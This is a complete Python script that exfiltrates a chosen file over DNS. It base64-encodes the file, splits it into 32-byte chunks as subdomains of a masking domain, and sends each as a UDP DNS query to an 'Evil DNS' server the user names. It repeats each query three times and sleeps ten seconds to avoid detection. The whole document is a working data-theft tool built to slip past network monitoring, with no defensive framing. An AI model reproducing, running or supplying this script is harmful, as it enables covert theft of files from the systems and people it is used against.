import dnslib
import socket
import base64
import time

# Input data
fileName = input("Enter the file name to exfiltrate: ")
domain   = input("Enter the domain name for exfiltration masking: ")
evilDNS  = input("Enter the IP address of the Evil DNS: ")

# Open the file to be sent
file = open(fileName, "rb")
file_data = file.read()
file.close()

#Convert the file data to base64
file_data = (base64.b64encode(file_data)).decode('utf-8')

# Split the file data into smaller chunks
chunk_size = 32 # bytes
num_chunks = len(file_data) // chunk_size
if len(file_data) % chunk_size != 0:
    num_chunks += 1
chunks = [file_data[i*chunk_size:(i+1)*chunk_size] for i in range(num_chunks)]

# Encode each chunk as a separate DNS query
for chunk in chunks:
    # Encode the chunk as a subdomain for the DNS query
    subdomain = f"{chunk}.{domain}"
    dns_query = dnslib.DNSRecord.question(subdomain).pack()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Send the DNS query 3 times (to avoid packet loss)
    for _ in range(3):
        sock.sendto(dns_query, (evilDNS, 53))
        # Sleep for 10 second to avoid detection
        time.sleep(10)